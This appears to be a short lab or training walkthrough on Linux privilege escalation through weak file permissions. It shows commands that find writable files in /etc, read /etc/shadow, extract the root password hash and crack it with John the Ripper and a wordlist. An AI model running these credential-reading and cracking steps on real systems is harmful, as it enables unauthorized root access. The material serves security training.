# Weak File Permissions

#### Investigate if you have any writable files that can be abused&#x20;

```bash
find /etc -maxdepth 1 -writable -type f
```

![](<../../.gitbook/assets/image (98).png>)

#### Check if you can read it.&#x20;

```bash
cat /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

Copy and paste the line of the root, and save it as hash.txt.

```
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```

Crack the hash.

{% code overflow="wrap" %}
```bash
john --format=sha512crypt --wordlist=/root/wd/rockyou.txt hash.txt

#Using default input encoding: UTF-8
#Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
#Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
#1g 0:00:00:03 DONE (2020-05-25 21:42) 0.3215g/s 452.7p/s 452.7c/s 452.7C/s teacher..tagged
#Use the "--show" option to display all of the cracked passwords reliably
#Session completed
```
{% endcode %}
